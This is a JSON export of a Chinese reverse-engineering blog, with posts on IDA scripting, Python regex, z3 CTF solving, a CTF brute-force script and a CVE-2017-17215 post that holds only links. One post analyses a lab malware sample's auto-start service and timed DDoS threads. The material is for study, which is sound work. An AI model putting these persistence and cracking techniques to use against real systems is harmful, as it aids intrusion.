{"meta":{"title":"蝉3301","subtitle":null,"description":"好少年光芒万丈","author":"蝉3301","url":""},"pages":[{"title":"comment","date":"2018-12-20T15:13:48.000Z","updated":"2020-01-18T07:50:17.467Z","comments":true,"path":"comment/index.html","permalink":"/comment/index.html","excerpt":"","text":"念两句诗 叙别梦、扬州一觉。 【宋代】吴文英《夜游宫·人去西楼雁杳》","keywords":"留言板"},{"title":"client","date":"2018-12-20T15:13:35.000Z","updated":"2019-11-16T09:29:49.000Z","comments":false,"path":"client/index.html","permalink":"/client/index.html","excerpt":"","text":"直接下载 or 扫码下载：","keywords":"Android客户端"},{"title":"lab","date":"2019-01-05T13:47:59.000Z","updated":"2019-11-16T09:29:49.000Z","comments":false,"path":"lab/index.html","permalink":"/lab/index.html","excerpt":"","text":"sakura主题balabala","keywords":"Lab实验室"},{"title":"bangumi","date":"2019-02-10T13:32:48.000Z","updated":"2020-04-01T03:09:55.988Z","comments":false,"path":"bangumi/index.html","permalink":"/bangumi/index.html","excerpt":"","text":"","keywords":null},{"title":"music","date":"2018-12-20T15:14:28.000Z","updated":"2019-11-16T09:29:49.000Z","comments":false,"path":"music/index.html","permalink":"/music/index.html","excerpt":"","text":"","keywords":"喜欢的音乐"},{"title":"theme-sakura","date":"2019-01-04T14:53:25.000Z","updated":"2019-11-16T09:29:49.000Z","comments":false,"path":"theme-sakura/index.html","permalink":"/theme-sakura/index.html","excerpt":"","text":"Hexo主题Sakura修改自WordPress主题Sakura，感谢原作者Mashiro","keywords":"Hexo 主题 Sakura 🌸"},{"title":"donate","date":"2018-12-20T15:13:05.000Z","updated":"2020-01-30T04:52:42.221Z","comments":false,"path":"donate/index.html","permalink":"/donate/index.html","excerpt":"","text":"顶！d=====(￣▽￣*)b","keywords":"顶！d=====(￣▽￣*)b"},{"title":"rss","date":"2018-12-20T15:09:03.000Z","updated":"2019-11-16T09:29:49.000Z","comments":true,"path":"rss/index.html","permalink":"/rss/index.html","excerpt":"","text":""},{"title":"links","date":"2018-12-19T15:11:06.000Z","updated":"2020-03-17T06:40:30.292Z","comments":true,"path":"links/index.html","permalink":"/links/index.html","excerpt":"","text":"group: 个人项目desc: 充分说明这家伙是条咸鱼 &lt; (￣︶￣)&gt;items: url: https://shino.cc/fgvfimg: https://cloud.moezx.cc/Picture/svg/landscape/fields.svgname: Googledesc: Google 镜像 url: https://shino.cc/fgvfimg: https://cloud.moezx.cc/Picture/svg/landscape/fields.svgname: Googledesc: Google 镜像","keywords":"友人帐"},{"title":"about","date":"2018-12-12T14:14:36.000Z","updated":"2019-11-16T09:29:49.000Z","comments":false,"path":"about/index.html","permalink":"/about/index.html","excerpt":"","text":"[さくら荘のhojun] 与&nbsp; Mashiro&nbsp; （ 真（ま）白（しろ） ） 对话中... bot_ui_ini()","keywords":"关于"},{"title":"video","date":"2018-12-20T15:14:38.000Z","updated":"2019-11-16T09:29:49.000Z","comments":false,"path":"video/index.html","permalink":"/video/index.html","excerpt":"","text":"var videos = [ { img: 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: '朝花夕誓——于离别之朝束起约定之花', status: '已追完', progress: 100, jp: 'さよならの朝に約束の花をかざろう', time: '放送时间: 2018-02-24 SUN.', desc: ' 住在远离尘嚣的土地，一边将每天的事情编织成名为希比欧的布，一边静静生活的伊欧夫人民。在15岁左右外表就停止成长，拥有数百年寿命的他们，被称为“离别的一族”，并被视为活着的传说。没有双亲的伊欧夫少女玛奇亚，过着被伙伴包围的平稳日子，却总感觉“孤身一人”。他们的这种日常，一瞬间就崩溃消失。追求伊欧夫的长寿之血，梅萨蒂军乘坐着名为雷纳特的古代兽发动了进攻。在绝望与混乱之中，伊欧夫的第一美女蕾莉亚被梅萨蒂带走，而玛奇亚暗恋的少年克里姆也失踪了。玛奇亚虽然总算逃脱了，却失去了伙伴和归去之地……。' }, { img : 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: '朝花夕誓——于离别之朝束起约定之花', status: '已追完', progress: 100, jp: 'さよならの朝に約束の花をかざろう', time: '2018-02-24 SUN.', desc: ' 住在远离尘嚣的土地，一边将每天的事情编织成名为希比欧的布，一边静静生活的伊欧夫人民。在15岁左右外表就停止成长，拥有数百年寿命的他们，被称为“离别的一族”，并被视为活着的传说。没有双亲的伊欧夫少女玛奇亚，过着被伙伴包围的平稳日子，却总感觉“孤身一人”。他们的这种日常，一瞬间就崩溃消失。追求伊欧夫的长寿之血，梅萨蒂军乘坐着名为雷纳特的古代兽发动了进攻。在绝望与混乱之中，伊欧夫的第一美女蕾莉亚被梅萨蒂带走，而玛奇亚暗恋的少年克里姆也失踪了。玛奇亚虽然总算逃脱了，却失去了伙伴和归去之地……。' } ] .should-ellipsis{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:95%;}.should-ellipsis-full{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:100%;}.should-ellipsis i{position:absolute;right:24px;}.grey-text{color:#9e9e9e !important}.grey-text.text-darken-4{color:#212121 !important}html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}img{border-style:none}progress{display:inline-block;vertical-align:baseline}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}html{-webkit-box-sizing:border-box;box-sizing:border-box}*,*:before,*:after{-webkit-box-sizing:inherit;box-sizing:inherit}ul:not(.browser-default){padding-left:0;list-style-type:none}ul:not(.browser-default)>li{list-style-type:none}.card{-webkit-box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2);box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2)}.hoverable{-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s}.hoverable:hover{-webkit-box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19);box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19)}i{line-height:inherit}i.right{float:right;margin-left:15px}.bangumi .right{float:right !important}.material-icons{text-rendering:optimizeLegibility;-webkit-font-feature-settings:'liga';-moz-font-feature-settings:'liga';font-feature-settings:'liga'}.row{margin-left:auto;margin-right:auto;margin-bottom:20px}.row:after{content:\"\";display:table;clear:both}.row .col{float:left;-webkit-box-sizing:border-box;box-sizing:border-box;padding:0 .75rem;min-height:1px}.row .col.s12{width:100%;margin-left:auto;left:auto;right:auto}@media only screen and (min-width:601px){.row .col.m6{width:50%;margin-left:auto;left:auto;right:auto}}html{line-height:1.5;font-family:-apple-system,BlinkMacSystemFont,\"Segoe UI\",Roboto,Oxygen-Sans,Ubuntu,Cantarell,\"Helvetica Neue\",sans-serif;font-weight:normal;color:rgba(0,0,0,0.87)}@media only screen and (min-width:0){html{font-size:14px}}@media only screen and (min-width:992px){html{font-size:14.5px}}@media only screen and (min-width:1200px){html{font-size:15px}}.card{position:relative;margin:.5rem 0 1rem 0;background-color:#fff;-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s;border-radius:2px}.card .card-title{font-size:24px;font-weight:300}.card .card-title.activator{cursor:pointer}.card .card-image{position:relative}.card .card-image img{display:block;border-radius:2px 2px 0 0;position:relative;left:0;right:0;top:0;bottom:0;width:100%}.card .card-content{padding:24px;border-radius:0 0 2px 2px}.card .card-content p{margin:0}.card .card-content .card-title{display:block;line-height:32px;margin-bottom:8px}.card .card-content .card-title i{line-height:32px}.card .card-reveal{padding:24px;position:absolute;background-color:#fff;width:100%;overflow-y:auto;left:0;top:100%;height:100%;z-index:3;display:none}.card .card-reveal .card-title{cursor:pointer;display:block}.waves-effect{position:relative;cursor:pointer;display:inline-block;overflow:hidden;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;-webkit-tap-highlight-color:transparent;vertical-align:middle;z-index:1;-webkit-transition:.3s ease-out;transition:.3s ease-out}.waves-effect img{position:relative;z-index:-1}.waves-block{display:block}::-webkit-input-placeholder{color:#d1d1d1}::-moz-placeholder{color:#d1d1d1}:-ms-input-placeholder{color:#d1d1d1}::-ms-input-placeholder{color:#d1d1d1}[type=\"radio\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"radio\"]:not(:checked)+span{position:relative;padding-left:35px;cursor:pointer;display:inline-block;height:25px;line-height:25px;font-size:1rem;-webkit-transition:.28s ease;transition:.28s ease;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border-radius:50%}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border:2px solid #5a5a5a}[type=\"radio\"]:not(:checked)+span:after{-webkit-transform:scale(0);transform:scale(0)}[type=\"checkbox\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"checkbox\"]:not(:checked):disabled+span:not(.lever):before{border:none;background-color:rgba(0,0,0,0.42)}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):before{width:0;height:0;border:3px solid transparent;left:6px;top:10px;-webkit-transform:rotateZ(37deg);transform:rotateZ(37deg);-webkit-transform-origin:100% 100%;transform-origin:100% 100%}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):after{height:20px;width:20px;background-color:transparent;border:2px solid #5a5a5a;top:0px;z-index:0}input[type=checkbox]:not(:disabled) ~ .lever:active:before,input[type=checkbox]:not(:disabled).tabbed:focus ~ .lever::before{-webkit-transform:scale(2.4);transform:scale(2.4);background-color:rgba(0,0,0,0.08)}input[type=range].focused:focus:not(.active)::-webkit-slider-thumb{-webkit-box-shadow:0 0 0 10px rgba(38,166,154,0.26);box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-moz-range-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-ms-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)} 番组计划 这里将是永远的回忆 window.onload = function(){ videos.forEach(function(video, i){ $('#rootRow').append(` ${video.title} ${video.jp} ${video.status} ${video.title} ${video.jp} 放送时间: ${video.time} ${video.desc} ${video.status} `) }) }","keywords":"B站"},{"title":"","date":"2020-01-30T04:43:10.195Z","updated":"2019-12-04T06:57:33.070Z","comments":true,"path":"tags/随笔/hello-world.html","permalink":"/tags/随笔/hello-world.html","excerpt":"","text":"fuckyou"}],"posts":[{"title":"恶意代码分析-lab-7","slug":"virus/恶意代码分析-lab7","date":"2020-06-01T06:16:37.000Z","updated":"2020-06-01T07:04:26.389Z","comments":true,"path":"2020/06/01/virus/恶意代码分析-lab7/","link":"","permalink":"/2020/06/01/virus/恶意代码分析-lab7/","excerpt":"","text":"lab7-1样机：win7分析工具：ida主要功能：创建开机自启动服务到特定时间对特定网址进行DDOS攻击分析ida查看导入表 创建服务函数：网络通信函数： 进入具体main函数，这里汇编比伪代码更清楚一点，利用了StartServiceCtrlDispatcherA函数 官方解释：将服务进程的主线程连接到服务控制管理器，这使得线程成为调用进程的服务控制调度程序线程。个人理解：打开服务控制管理器，为后面创建服务等操作提供基础其中lpServiceProc指向关键函数sub_401040，意思是，这个函数执行完之后执行sub_401040 进入sub_401040，伪代码的逻辑十分清晰首先判断是否有名为HGL345重复互斥量，有则退出，没有创建互斥量获取当前程序的伪句柄GetCurrentProcess，通过GetModuleFileNameA得到当前程序的路径新建服务，划红线的是关键的点，lpBinaryPathName将之前GetModuleFileNameA得到的路径利用，dwStartType设置服务启动属性，2表示开机自动启动，dwServiceType指定服务类型（此文件没完整利用到）将0给systemtime进行初始化，然后将2100给systime的年，通过SystemTimeToFileTime进行时间格式转换CreateWaitableTimerA建立一个闹钟，SetWaitableTimer设置时间为2100年1月1日启动后面建立20个线程，入口函数为StartAddress线程函数是一个无限循环的网站下载，肉鸡的DDOS攻击","categories":[{"name":"virus","slug":"virus","permalink":"/categories/virus/"}],"tags":[],"keywords":[{"name":"virus","slug":"virus","permalink":"/categories/virus/"}]},{"title":"ctf工具总结","slug":"ctf/ctf总结工具","date":"2020-04-21T09:27:41.000Z","updated":"2020-04-21T09:38:24.600Z","comments":true,"path":"2020/04/21/ctf/ctf总结工具/","link":"","permalink":"/2020/04/21/ctf/ctf总结工具/","excerpt":"","text":"patch爆破（L-W都可）这种方法主要是用来抢签到题一血的，flag字符串之间没有关系且有对错回复的题目都可用（linux的话把exe去掉就行） from subprocess import Popen,PIPE path=”dump.exe” flag=”” ‘’’ print(“please input first_address====&gt;\\t”);start=int(input()) print(“please input end_address====&gt;\\t”);end=int(input()) print(“please input code_string====&gt;\\t”);firs=input() ‘’’ start=1;end=23;firs=”01837c2418”;process_ans=’Good’ for i in range(start,end): patch=bytes.fromhex(firs+hex(i).replace(“0x”,””).zfill(2)) fea=bytes.fromhex(firs+”01”) f1=open(“dump.exe”,”wb”) f2=open(“1.exe”,”rb”) arr=f2.read() arr=arr.replace(fea,patch) f1.write(arr) f1.close() f2.close() for j in range(0x10,0x80): tmp=flag+chr(j) p=Popen(path,stdin=PIPE,stdout=PIPE) p.stdin.write(tmp.encode()) if(process_ans in str(p.communicate()[0])): flag=tmp print (flag) break题目：OBFU的复仇.exe2000多个函数，分析算法可能会死掉，主要用了OBFU的混淆，然后他的结果之间互相没有关系，而且会有反馈，所以可以用做一个实例。ida伪代码逻辑很简单，经过一个函数sub_41644A的运算，然后进行了和运算和异或运算最后得到相应的数值，直接上爆破代码，得出结果，有趣","categories":[{"name":"逆向","slug":"逆向","permalink":"/categories/逆向/"}],"tags":[],"keywords":[{"name":"逆向","slug":"逆向","permalink":"/categories/逆向/"}]},{"title":"逆向杂项","slug":"re/逆向杂项","date":"2020-03-31T11:39:22.000Z","updated":"2020-04-01T03:06:55.377Z","comments":true,"path":"2020/03/31/re/逆向杂项/","link":"","permalink":"/2020/03/31/re/逆向杂项/","excerpt":"","text":"在逆向学习里面遇到的一些比较方便的算法啥的，就总结在这里，虽然杂但是应该会有用&lt;(￣▽￣)/ IDA-IDC（自从idapython能用之后，我打算放弃idc了，所以idc到这里就没了，idc确实没有python方便，我认了，来自某高的建议（手动狗头））定义：auto i,j,k;extern outsideGlobal; //引入全局变量声明 常用函数void PatchByte(long addr , long val) 设置虚拟地址addr处的一个字节值，PatchByte可更换为PatchWord，PatchDword设置虚拟地址addr处的2字节和4字节值。 long Byte（long addr） 从虚拟地址addr读取一个字节值，Byte可更换为Word，Dword读取2字节和4字节值。 void Message（string format , …）,在输出窗口打印一条格式化消息。 void print（…），在输出窗口中打印每个参数的字符串表示形式。 long atol（string val），将10进制val转化成对应整数值。 long xtol（string val），将16进制val转化成对应整数值。 long ord（string ch），返回单字符字符串ch的ASCII值。 string Name（long addr），返回与给定地址有关的名称，如果该位置没有名称，则返回空字符串。 string用法和python一样 auto str = “String to slice”; auto s1, s2, s3, s4; s1 = str[7:9]; //&#39;to&#39; s2 = str[ :6]; //&#39;String&#39; s3 = str[10: ]; //&#39;slice&#39; s4 = str[5]; //&#39;g&#39; 上述内容摘抄于Thunder_J的csdn 注意问题里面的语法不支持i+=1;只支持i=i+1；想打印出ascii值，需要的是Message(“%x”,ord(xxx)),必须要有前面的格式化字符，不然只会给你打印出字符来。 ctf实践auto i; for(i=0x40213b;i&gt;=0x402124;i--) { Message((Byte(i)^6)-1); //我发现他自己转成字符串了，真方便O(∩_∩)O~~ } Message(&quot;\\n&quot;) IDA-Python不管怎么样，python牛逼 ea代表地址 一些常规操作，暂时还没咋用到 ①here()==ScreenEA() #打印当前光标标记地址 ②GetDisasm(ea) #打印地址处汇编指令 ③GetMnem(ea) #只打印指令例如mov cmp之类 ④GetOpnd(ea,n) #操作数，rax，rdx之类，n有0,1，分别表这句汇编指令的某个操作数 ⑥SegName(ea) SegStart(ea) SegEnd(ea) #段名称、段初始地址、段结束地址 ⑦for fuc in Functions(): print hex(fuc),GetFunctionName(fuc) //遍历函数 **显示地址处的字节数** Byte() #同理还有word(ea)、Dword(ea)、Qword(ea)、GetFloat(ea)、GetDouble(ea) **patch数据** PatchByte(ea, value)、PatchWord(ea, value)、PatchDword(ea, value) 这里展现一下效果图 实际运用这里先放一个恶意代码里面说的修改call颜色，等以后再放自己实践用到的 from idautils import from idc import heads = Heads(SegStart(ScreenEA()),SegEnd(ScreenEA())) fuc=[] for i in heads: if GetMnem(i) == &quot;call&quot;: fuc.append(i) print(len(fuc)) for i in fuc: SetColor(i,CIC_ITEM,0xc7fdff) C语言常见函数atoi &amp;&amp; _itoaatoi 参数：char 作用：字符串（字符串为char类型）转int型 a=&quot;123&quot;; b=atoi(a); printf(b); 输出：123（且int b=123） atoi有一个特性，遇到非数字就会截止转换，但前面的会转换 _itoa(value,string,radix) 参数value：欲转换的数据。string：目标字符串的地址。radix：转换后的进制数，可以是10进制、16进制等，范围必须在 2-36。 作用：int型转字符串 做了一道功放世界新放的逆向，名称：Mysterious难度不大，想试着直接静态调试，发现卡在了一个函数身上，思路也是卡死了，应该想到这是一道溢出的ida图片分析如下思路想通了很简单，溢出string给到v12、v13、v14，然后string给v10,就是卡在了atoi遇到非数字就截止但前面都会转换的功能上，知道之后，输入122xyz，122给了v10，剩下xyz分别给了v12、v13、v14，得到结果 本内容中的参数摘抄于lanzhihui_的csdn C格式问题1.for循环，想要4个4个的跳，第三部分格式应为i=i+4而不是i+=4，不然会报Missing brace pythonpyton的一些骚姿势（就是简便代码写法）for循环可以写成 [print(i) for i in range(10)] （后面的很多式子都会用到这个） 字符和数组[asc码]的拼接 str+=&quot;&quot;.join([chr(i) for i in (arr)]) a1,a2的快速建立(z3用的比较方便)：[print(&quot;a%d=%d&quot; % (i,arr[i])) for i in range(10)](将arr值分别给a1,a2,a3) 字典的建立个人感觉没啥用，但也算是知识点，就放到这里来 a=[1,2,3];b=[&#39;a&#39;,&#39;b&#39;,&#39;c&#39;] ddd=zip(a,b) #zip()将a,b打包成元祖，就是1和a一组，2和b一组 dic=dict(ddd) #建立dict字典 dict正常建立：dict={1:&#39;a&#39;,2:&#39;b&#39;} print(dic) 效果图如下这里说一下，我在做ctf移位复原器的时候，想用这个，但发现如果里面dic[]里面的值是一种式子而不是直接的指定字符，就类似与是dic[mov_dic[i+2]]而不是dic[1]返回的类型就会一直是nobetype，什么也没法转换的一种类型，我人都傻了，技能有限，等以后有这个实力了，再继续利用 re正则表达式的应用这种库就是类似于搜索关键字，或者是把一种写作形式换成另一种写作形式，自动化的文本替换，学习一下，在z3里面用的比较多，可以格式化很多东西，到时候二进制文件内部编辑应该会方便许多，先学会 ###函数介绍：re.match(pattern,string,flags) #pattern：表达式、string：目标字符串只与string开头进行匹配，开头没有返回none，有的话返回相应的group字符串 re.search(pattern,string,flags)从整个string进行匹配，返回同理match re.sub(pattern,repl,string,count,flags) #count：替换最大次数，默认0全替换从string匹配pattern然后替换成repl re.compile(pattern,flag)产生一种pattern，用来直接送给match、search用 re.findall(string, pos, endpos) #pos字符串起始位置 endpos结束位置把所有匹配都找出来，match、search只找一次，用数组的形式传出来,只能和compile合作使用 re.finditer(pattern,string，flags)迭代方式把所有匹配表示出来，只能通过for i in it的方式表达，it的类型是callable-iterator，数组引不出来 ###实例： #!/usr/bin/python # -*- coding: UTF-8 -*- import re s1=&quot;I&quot; s2=&quot;I Love you baby&quot; s3=&#39;baby&#39; #match、search匹配 match1=re.match(s1,s2) print(match1.group()) search1=re.search(s3,s2) print(search1.span(),search2.span()) #group展示（这里(.*)算一个group，.*只进行匹配不放进group） seobj=re.search(r&#39;(.*) (.*?) you .*&#39;,s2) print(seobj.group()) print(seobj.group(1)) print(seobj.group(2)) #sub应用 phone = &quot;2004-959-559 # 这是一个国外电话号码&quot; # 删除字符串中的 Python注释 num = re.sub(r&#39;#.*&#39;, &quot;&quot;, phone) print &quot;电话号码是: &quot;, num print phone # 删除非数字(-)的字符串 num = re.sub(r&#39;\\D&#39;, &quot;&quot;, phone) #（\\D将除数字外的东西全部去掉） print &quot;电话号码是 : &quot;, num #compile、findall、finditer应用 patt=re.compile(r&#39;\\d+&#39;) m = patt.search(&quot;abxs12s45sads74&quot;) print m.group() print m.start() print m.end() print m.span() m = patt.findall(&quot;abxs12s45sads74&quot;) print m it = re.finditer(r&quot;\\d+&quot;,&quot;12a32bc43jf3&quot;) for i in it: print (i.group() ) 效果图： ###flag库和表达式类型 #flag库 re.I 忽略大小写 re.L 表示特殊字符集 \\w, \\W, \\b, \\B, \\s, \\S 依赖于当前环境 re.M 多行模式 re.S 即为 . 并且包括换行符在内的任意字符（. 不包括换行符） re.U 表示特殊字符集 \\w, \\W, \\b, \\B, \\d, \\D, \\s, \\S 依赖于 Unicode 字符属性数据库 re.X 为了增加可读性，忽略空格和 # 后面的注释 表达式类型： ## pe\\elf相关文件处理PE修改OEP这个操作很简单，修改一个值就ok了，可以PE-tools，可以直接二进制编译器，都可，亲测有效 首先自己写了一个c语言脚本做判断，编译出来发现是jump起步，因为用的vs，不过这都无所谓了。我们发现这堆jmp下面就有一堆空代码所以直接利用 空位置写入jmp的机器码，卡了一会，明白了原理，E9是jmp后面四个字节（dword）用来放偏移，上偏就是负数，下偏就是正数，base值是这块指令地址+5，然后根据计算，我们要去0x343，在0x398+5进行改变，既0x39d，然后0x343-0x39d=0xffffffa6,写上去就行，上图末端有展示 然后PE-tools修改oep二进制工具修改oep 最终结果oep都发生了改变","categories":[{"name":"逆向","slug":"逆向","permalink":"/categories/逆向/"}],"tags":[],"keywords":[{"name":"逆向","slug":"逆向","permalink":"/categories/逆向/"}]},{"title":"z3学习","slug":"re/z3学习","date":"2020-03-31T11:39:15.000Z","updated":"2020-03-31T12:45:17.947Z","comments":true,"path":"2020/03/31/re/z3学习/","link":"","permalink":"/2020/03/31/re/z3学习/","excerpt":"","text":"z3借鉴了JX Note的博客题目解答借鉴了夏了茶糜的博客 这次结合着python的re正则表达式，来对z3进行一次系统的学习，如果写好了，事半功倍，一旦里面出点差错，基本上就没的搞了。后面会有补充，会什么就写什么吧。 z3一些点创建变量[Int(‘a%d’%i) for i in range(15)]、[BitVec(‘a%d’%i) for i in range(15)]还有Real之类的等等，这里注意一下，虽然变量叫a1，a2之类的，但在后面写表达式可以用a[i]表达 创建求解器s=z3.Solver() ##记得括号 添加表达式s.add()这里添加可以通过eval(str)进行批量添加 检查约束条件s.check() ##结果只有sat和unsats.check ##我们构造的check结构 得出结果s.model()出来的type是个instance类型，算是一个畸形字典，现在我还是不太懂，等后面深入学习一下python在做补充现在假设a1=0,a2=1,a3=2m=s.model()print mprint m[a1] 结果展示：[a1=0,a2=1,a3=2]0 instance通过as_long()转换成instancemethod类型，然后就可以运算啥的，各种变幻了res=(m[a0].as_long()^i)&lt;&lt;5 大致z3就是这么个东西，很方便的一个工具 例题攻防世界————babyunic这道题，真的挺牛逼的，里面我还学到了设置lib库导入的姿势，虽然对这个题没什么逼用，具体的就不分析了，主要是中间正则的表达式，这道题就是先用unicorn-engine框架创建，然后调用了一个mips的func，主要函数在mips的func里面，里面就是一个42方程，然后这里作者用的re正则把整个copy过来的式子简化放到z3了，这里我也是学着写了写 脚本： #ida-python import binascii for i in range(0x0000000000202020,0x00000000002020C7,4): if Byte(i)==0xff: print str(-(0-int(binascii.hexlify(get_bytes(i,4)),16)&amp;0xffffffff))+&quot;,&quot;, else: print str(int(binascii.hexlify(get_bytes(i,4)),16))+&quot;,&quot;, print #因为是大端序，所以需要用大端序方式读，ida编译出来的是小段序，这里我直接是进行了十六进制负数的转化 #解题脚本 import ctypes import z3 import ctypes import re #这里我只写了一部分，想做题的可以直接去[夏了茶糜](https://blog.csdn.net/qin9800/article/details/104826788)博客看，不然这个42元方程太长了 a=&#39;&#39;&#39;*piParm2 = ((((((((((((((((((((((((((((((((uint)*pbParm1 + (uint)pbParm1[1] + (uint)pbParm1[2]) - (uint)pbParm1[3]) + (uint)pbParm1[4]) - (uint)pbParm1[5]) - (uint)pbParm1[6]) - (uint)pbParm1[7]) - (uint)pbParm1[8]) + (uint)pbParm1[9] + (uint)pbParm1[10]) - (uint)pbParm1[0xb]) + (uint)pbParm1[0xc]) - (uint)pbParm1[0xd]) - (uint)pbParm1[0xe]) + (uint)pbParm1[0xf]) - (uint)pbParm1[0x10]) - (uint)pbParm1[0x11]) + (uint)pbParm1[0x12] + (uint)pbParm1[0x13]) - (uint)pbParm1[0x14]) + (uint)pbParm1[0x15] + (uint)pbParm1[0x16] + (uint)pbParm1[0x17] + (uint)pbParm1[0x18]) - (uint)pbParm1[0x19]) + (uint)pbParm1[0x1a]) - (uint)pbParm1[0x1b]) + (uint)pbParm1[0x1c] + (uint)pbParm1[0x1d]) - (uint)pbParm1[0x1e]) - (uint)pbParm1[0x1f]) + (uint)pbParm1[0x20]) - (uint)pbParm1[0x21]) + (uint)pbParm1[0x22] + (uint)pbParm1[0x23]) - (uint)pbParm1[0x24]) - (uint)pbParm1[0x25]) + (uint)pbParm1[0x26]) - (uint)pbParm1[0x27]) + (uint)pbParm1[0x28] + (uint)pbParm1[0x29]; &#39;&#39;&#39; res=[ -108, -200, 294, -216, -1008, 660, -866, 1770, 220, 6, -244, -522, -1406, -816, 386, 990, 334, 690, -1832, 372, -1370, -1580, 450, -1668, 858, 326, -196, -1516, 462, 2012, -696, 152, 2142, -592, -68, 878, -178, -1994, 1472, 1710, 1684, 34] #上面是我直接得出的数组，下面是原作者通过ctype得出来的 tmp = [&#39;ffffff94&#39;, &#39;ffffff38&#39;, &#39;00000126&#39;, &#39;ffffff28&#39;, &#39;fffffc10&#39;, &#39;00000294&#39;, &#39;fffffc9e&#39;, &#39;000006ea&#39;, &#39;000000dc&#39;, &#39;00000006&#39;, &#39;ffffff0c&#39;, &#39;fffffdf6&#39;, &#39;fffffa82&#39;, &#39;fffffcd0&#39;, &#39;00000182&#39;, &#39;000003de&#39;, &#39;0000014e&#39;, &#39;000002b2&#39;, &#39;fffff8d8&#39;, &#39;00000174&#39;, &#39;fffffaa6&#39;, &#39;fffff9d4&#39;, &#39;000001c2&#39;, &#39;fffff97c&#39;, &#39;0000035a&#39;, &#39;00000146&#39;, &#39;ffffff3c&#39;, &#39;fffffa14&#39;, &#39;000001ce&#39;, &#39;000007dc&#39;, &#39;fffffd48&#39;, &#39;00000098&#39;, &#39;0000085e&#39;, &#39;fffffdb0&#39;, &#39;ffffffbc&#39;, &#39;0000036e&#39;, &#39;ffffff4e&#39;, &#39;fffff836&#39;, &#39;000005c0&#39;, &#39;000006ae&#39;, &#39;00000694&#39;, &#39;00000022&#39;] piParm2 = list(map(lambda x:z3.IntVal(ctypes.c_int32(int(x,16)).value),tmp)) #正则表达式的对齐 a=re.sub(r&#39;\\(uint\\)&#39;,&quot;&quot;,a) #去掉(uint) ps:因为正则表达式中，一个()表达一个group，所以我们这里需要将他转义成正常字符，这里的r有没有都可以 a=re.sub(r&#39;\\*pbParm1&#39;,&quot;pbParm1[0x0]&quot;,a) #有一个没下标，更改一下下标，*记得转义 #替换回车、空格、大空格 a=re.sub(&#39;\\n&#39;,&quot;&quot;,a) a=re.sub(&#39; &#39;,&quot;&quot;,a) a=re.sub(&#39;\\t&#39;,&quot;&quot;,a) #将所有[]里的值变成0x之类的，例如[0x0]、[0x1]等等 for i in range(11): a=re.sub(r&quot;\\[%d\\]&quot; %i,&quot;[%s]&quot;%hex(i),a) #将所有pbParm1[0xk] 变成m[t] for i in range(42): a=re.sub(r&quot;pbParm1\\[%s\\]&quot;%hex(i),&quot;m[%d]&quot;%i,a) #去掉开头的piParm2 a=re.sub(r&quot;piParm2\\[%s\\]&quot;,&quot;&quot;,a) #替换等号，去掉; a=re.sub(&#39;=&#39;,&quot;&quot;,a) a=re.sub(&#39;;&#39;,r&quot; ==&quot;+&quot;\\n&quot;,a) #设置正则表达式 patt=re.compile(r&quot;\\(.*?==&quot;) #ps?表示取正则匹配到的数据中最小的一种 #创建数组 arr=patt.findall(a) #编写z3 m=[z3.Int(&#39;m%d&#39;%i) for i in range(42)] s=z3.Solver() #print len(arr) #print #print m for i in m: s.add(i&lt;0xff) s.add(i&gt;0) k=0 #print s for i in arr: #print i+str(res[k]) s.add(eval(i+str(res[k]))) k+=1 flag=&quot;&quot; #打印输出 if s.check()== z3.sat: tem=s.model() print type(tem[m[0]].as_long) for i in range(42): te=tem[m[i]].as_long() ^ i #print te flag+=(chr(((te&gt;&gt;3)&amp;0xff)+(te&lt;&lt;5)&amp;0xff)) print flag 效果图：用了一下午，感觉挺有趣的，就记下来，以后应该会用到。累了，去玩会","categories":[{"name":"逆向","slug":"逆向","permalink":"/categories/逆向/"}],"tags":[],"keywords":[{"name":"逆向","slug":"逆向","permalink":"/categories/逆向/"}]},{"title":"路由器逆向分析———CVE-2017-17215复现","slug":"cve/路由器逆向分析——CVE-2017-17215复现","date":"2020-03-25T02:10:10.000Z","updated":"2020-03-25T03:22:44.265Z","comments":true,"path":"2020/03/25/cve/路由器逆向分析——CVE-2017-17215复现/","link":"","permalink":"/2020/03/25/cve/路由器逆向分析——CVE-2017-17215复现/","excerpt":"","text":"在我们搭好qemu环境之后就可以来找cve复现了，这里我选择的是cve-2017-17215 放上师傅们的地址http://ronpa.top/2018/11/29/CVE-2017-17215%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/https://xz.aliyun.com/t/4819https://www.freebuf.com/vuls/160040.htmlhttps://paper.seebug.org/490/ 